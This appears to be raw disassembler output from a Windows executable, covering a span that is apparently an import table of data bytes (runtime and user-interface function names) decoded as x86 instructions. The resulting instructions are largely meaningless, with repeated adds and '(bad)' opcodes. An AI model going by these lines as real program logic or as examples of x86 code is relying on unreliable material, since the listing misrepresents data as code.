  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
